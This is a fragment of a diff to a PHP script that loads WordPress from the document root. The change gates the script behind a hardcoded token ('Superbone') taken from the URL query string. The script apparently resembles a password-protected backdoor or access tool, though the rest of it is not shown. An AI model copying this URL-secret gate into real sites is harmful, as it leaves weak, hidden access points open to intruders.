@@ -1,4 +1,13 @@
 <?php
+$valid_token = "Superbone";
+
+// Ambil token dari URL
+$token = isset($_GET['token']) ? $_GET['token'] : "";
+
+// Cek apakah token cocok
+if ($token !== $valid_token) {
+    die("<b>Access Denied!</b> Please contact Administrator.");
+}
 $mr=$_SERVER['DOCUMENT_ROOT'];
 @chdir($mr);
 if (file_exists('wp-load.php')){
